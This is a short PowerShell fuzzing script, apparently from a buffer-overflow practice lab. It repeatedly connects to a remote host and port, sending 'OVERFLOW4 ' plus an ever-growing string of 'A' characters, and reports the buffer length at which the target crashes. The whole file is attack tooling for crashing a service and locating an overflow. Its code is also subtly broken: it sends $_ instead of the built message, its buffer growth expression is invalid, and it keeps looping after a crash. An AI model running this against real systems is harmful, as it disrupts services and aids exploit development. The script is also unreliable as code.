$RHOST=""
$RPORT=""
$prefix="OVERFLOW4 "

$buffer='A'*100

$ipAddr=[System.Net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($RHOST))
while($true){
    try{
        $Socket = New-Object System.Net.Sockets.TCPClient($ipAddr,$RPORT)
        $Stream = $Socket.GetStream() 
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $message=$prefix+$buffer
        $Writer.WriteLine($_)
        $Writer.Flush()
        $buffer=$buffer+100*'A'
        Start-Sleep -Milliseconds 500
    }
    catch{
        Write-Host "Program crushed at: " $buffer.Length
        Read-Host "End. (press key)"
    }
}